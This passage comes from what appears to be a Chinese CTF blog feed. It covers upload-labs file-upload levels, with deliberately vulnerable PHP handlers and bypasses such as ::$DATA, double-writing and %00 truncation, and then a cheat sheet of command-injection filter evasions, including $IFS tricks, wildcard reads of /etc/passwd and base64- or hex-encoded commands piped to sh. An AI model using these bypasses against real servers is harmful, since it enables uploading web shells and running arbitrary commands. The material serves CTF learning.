&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-7"><a href="#解答：-7" class="headerlink" title="解答："></a>解答：</h3><p>.绕过，穿上<code>phpinfo.php.</code>，访问<code>php.</code>即可。</p>
<h2 id="level-9-DATA绕过"><a href="#level-9-DATA绕过" class="headerlink" title="level-9(::$DATA绕过)"></a>level-9(::$DATA绕过)</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-8"><a href="#解答：-8" class="headerlink" title="解答："></a>解答：</h3><p>可以发现没有去除字符串::$DATA</p>
<p>思路：同第六题一样，利用windows的特性，这里黑名单没有过滤<code>::$DATA</code>，因此上传<code>xx.php::$DATA</code>，上传成功后windows会自动去除<code>::$DATA</code></p>
<p>上传文件<code>.php::$DATA</code></p>
<h2 id="level-11-双写绕过"><a href="#level-11-双写绕过" class="headerlink" title="level-11(双写绕过)"></a>level-11(双写绕过)</h2><h3 id="源码：-7"><a href="#源码：-7" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-9"><a href="#解答：-9" class="headerlink" title="解答："></a>解答：</h3><p>双写绕过</p>
<p>上传：<code>.pphphp</code>，进过黑名单过滤，会变成<code>.php</code></p>
<h2 id="level-12-白名单绕过之get型：-00"><a href="#level-12-白名单绕过之get型：-00" class="headerlink" title="level-12(白名单绕过之get型：%00)"></a>level-12(白名单绕过之get型：%00)</h2><h3 id="源码：-8"><a href="#源码：-8" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>此题对环境有特殊要求，目前无法复现，直接使用大佬的笔记内容</p>
<p>4月24日更新：复现完成。修改php.ini相应参数，已经PHP5.2.17</p>
<p>前提：该题需要magic_quotes_gpc=off、php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
<p>思路：因为$img_path是拼接而成，所以直接使用%00截断后面的内容，因此，先上传xx.jpg，再使用bp截断</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531465726-00632d46-795a-48ec-ad77-0f13e3a70091.png" alt="img"></p>
<h2 id="level-13-白名单绕过之post型：0x00"><a href="#level-13-白名单绕过之post型：0x00" class="headerlink" title="level-13(白名单绕过之post型：0x00)"></a>level-13(白名单绕过之post型：0x00)</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-10"><a href="#解答：-10" class="headerlink" title="解答："></a>解答：</h3><p>依旧是白名单绕过。post型，hex中0x00绕过。</p>
<p><img src="https://i.loli.net/2021/04/24/dknpOMe8iFHLTSl.png" alt="image-20210424110054827"></p>
<p>在hex中，找到<code>1.php</code>对应的十六进制数值，70、68、70，在70后插入一个字节 00 </p>
<p>直接访问阶段前的php文件即可。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF命令执行技巧总结</title>
    <url>/2021/04/21/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="CTF命令执行技巧总结"><a href="#CTF命令执行技巧总结" class="headerlink" title="CTF命令执行技巧总结"></a>CTF命令执行技巧总结</h1><p>对于近期CTF中命令执行的学习总结</p>
<span id="more"></span>
<h2 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h2><p>命令执行需要执行，贴出大佬关于代码执行和系统命令执行的讲解，不详细展开。</p>
<blockquote>
<p><a href="[https://wh0ale.github.io/2019/01/13/2019-1-13-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/](https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/">wh0ale博客：命令执行漏洞进阶详解</a>)</p>
</blockquote>
<h2 id="Linux绕过姿势"><a href="#Linux绕过姿势" class="headerlink" title="Linux绕过姿势"></a>Linux绕过姿势</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$IFS$1</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;     比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09 &#x2F;&#x2F;php环境下</span><br></pre></td></tr></table></figure>
<h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">|        &#x2F;&#x2F;直接执行后面的语句</span><br><span class="line">||       &#x2F;&#x2F;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;       &#x2F;&#x2F;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
<h3 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;who</span><br><span class="line">b&#x3D;ami</span><br><span class="line">$a$b &#x2F;&#x2F;输出whoami</span><br><span class="line">q&#x3D;l; w&#x3D;s; e&#x3D;&quot; -al&quot;; $q$w$e   &#x2F;&#x2F;执行ls -al命令</span><br><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag; $a$b $c$d    &#x2F;&#x2F;cat flag</span><br></pre></td></tr></table></figure>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;执行命令 cat flag</span><br><span class="line">&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">cat f*</span><br><span class="line">cat fl[abc]g         &#x2F;&#x2F;匹配[abc]中的任何一个</span><br><span class="line">cat f[a-z]ag         &#x2F;&#x2F;匹配a-z范围的任何字符</span><br><span class="line">利用正则:比如要读取etc&#x2F;passwd</span><br><span class="line">cat &#x2F;???&#x2F;??????</span><br><span class="line">cat &#x2F;???&#x2F;pass*</span><br><span class="line">cat &#x2F;etc$u&#x2F;passwd    &#x2F;&#x2F;变量u未定义，则为空</span><br></pre></td></tr></table></figure>
<h3 id="新姿势：Linux环境变量"><a href="#新姿势：Linux环境变量" class="headerlink" title="新姿势：Linux环境变量"></a>新姿势：Linux环境变量</h3><p>翻大佬博客时发现的姿势：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;PATH&#125;            #&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">echo $&#123;PATH:1:9&#125;        #&#x2F;usr&#x2F;local</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;  #拼接后是ls,执行命令</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531475350-95532a66-e878-49c6-ac42-7576b108b575.png" alt="image-20210421181825782"></p>
<h3 id="绕过ban位-常规操作"><a href="#绕过ban位-常规操作" class="headerlink" title="绕过ban位(常规操作)"></a>绕过ban位(常规操作)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wh\o\ami    &#x2F;&#x2F;反斜线绕过</span><br><span class="line">who&quot;a&quot;mi    &#x2F;&#x2F;双引号绕过</span><br><span class="line">whoa&#39;m&#39;i    &#x2F;&#x2F;单引号绕过</span><br><span class="line">whoam&#96;&#96;i    &#x2F;&#x2F;反引号绕过</span><br><span class="line">echo d2hvYW1p|base64 -d|sh                 &#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">echo d2hvYW1p|base64 -d|bash               &#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">&#96;echo d2hvYW1p|base64 -d&#96;                  &#x2F;&#x2F;将其base64解码,然后用反引号来执行命令</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash       &#x2F;&#x2F;hex绕过,其中77686F616D69是whoami的hex编码</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;&#x3D;10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    </span><br><span class="line">&#x2F;&#x2F;在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh$1oami        &#x2F;&#x2F;不带中括号只能用一个字符在$后面</span><br><span class="line">who$@ami	</span><br><span class="line">whoa$*mi</span><br><span class="line">whoa$&#123;66&#125;mi     &#x2F;&#x2F;带中括号能用任意字符，但是字符内必须相同</span><br><span class="line">whoa$&#123;hh&#125;mi     &#x2F;&#x2F;不能带符号，会被解析成奇怪的东西</span><br></pre></td></tr></table></figure>
<p>正则 (假设/bin/cat: test: 是一个目录)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">&#x2F;???&#x2F;?at ????</span><br><span class="line">&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>$1、$2等和$@</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$#   &#x2F;&#x2F;是传给脚本的参数个数</span><br><span class="line">$0   &#x2F;&#x2F;是脚本本身的名字</span><br><span class="line">$1   &#x2F;&#x2F;是传递给该shell脚本的第一个参数</span><br><span class="line">$2   &#x2F;&#x2F;是传递给该shell脚本的第二个参数</span><br><span class="line">$@   &#x2F;&#x2F;是传给脚本的所有参数的列表</span><br><span class="line">$*   &#x2F;&#x2F;是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$   &#x2F;&#x2F;是脚本运行的当前进程ID号</span><br><span class="line">$?   &#x2F;&#x2F;是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
<h3 id="绕过ban位之cat"><a href="#绕过ban位之cat" class="headerlink" title="绕过ban位之cat"></a>绕过ban位之cat</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</span><br><span class="line">grep test *file</span><br><span class="line">示例：grep &#123; *???    &#x2F;&#x2F;读flag.php</span><br></pre></td></tr></table></figure>
<h3 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">666&#96;whoami&#96;666      &#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">666&#96;\whoami&#96;666     &#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">&#x2F;&#x2F;命令执行后的结果在2个666中间</span><br><span class="line"></span><br><span class="line">w&#96;f1hgb&#96;ho&#96;f1hgb&#96;am&#96;f1hgb&#96;i     &#x2F;&#x2F;反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">w&#96;\f1hgb&#96;ho&#96;\f1hgb&#96;am&#96;\f1hgb&#96;i  &#x2F;&#x2F;这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">wh$(f1hgb)oa$(f1hgb)mi          &#x2F;&#x2F;和上面的差不多,都说执行和拼接    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="命令执行函数绕过（以system为例）"><a href="#命令执行函数绕过（以system为例）" class="headerlink" title="命令执行函数绕过（以system为例）"></a>命令执行函数绕过（以system为例）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;cat &#x2F;etc&#x2F;passwd&quot;)</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">(sy.(st).em)(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;还可以用注释方法绕过</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(&quot;cat &#x2F;etc&#x2F;passwd);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;(sy.&#x2F;*fthgb666*&#x2F;(st)&#x2F;*fthgb666*&#x2F;.em)&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br></pre></td></tr></table></figure>
<h3 id="简单地绕过长度限制"><a href="#简单地绕过长度限制" class="headerlink" title="简单地绕过长度限制"></a>简单地绕过长度限制</h3><h4 id="Linux中的-gt-符号和-gt-gt-符号"><a href="#Linux中的-gt-符号和-gt-gt-符号" class="headerlink" title="Linux中的&gt;符号和&gt;&gt;符号"></a>Linux中的&gt;符号和&gt;&gt;符号</h4><p>(1)通过<code>&gt;</code>来创建文件</p>
<p>(2)通过<code>&gt;</code>将命令结果存入文件中<br>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建该文件再存入</p>
<h4 id="Linux中命令换行"><a href="#Linux中命令换行" class="headerlink" title="Linux中命令换行"></a>Linux中命令换行</h4><p>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加<code>\</code>，可以将一条命令写在多行<br>比如一条命令<code>cat flag</code>可以如下表示</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~# <span class="title">ca</span>\</span></span><br><span class="line"><span class="function">&gt; <span class="title">t</span>\</span></span><br><span class="line"><span class="function">&gt;  <span class="title">fl</span>\</span></span><br><span class="line"><span class="function">&gt; <span class="title">ag</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
<p>既然可以这样那我们是不是可以在某些限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行，尝试一下</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~# <span class="title">echo</span> &quot;<span class="title">ca</span>\\&quot;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot;<span class="title">t</span>\\&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot; <span class="title">fl</span>\\&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot;<span class="title">ag</span>&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">cat</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">ca</span>\</span></span><br><span class="line"><span class="function"><span class="title">t</span>\</span></span><br><span class="line"><span class="function"> <span class="title">fl</span>\</span></span><br><span class="line"><span class="function"><span class="title">ag</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">sh</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span 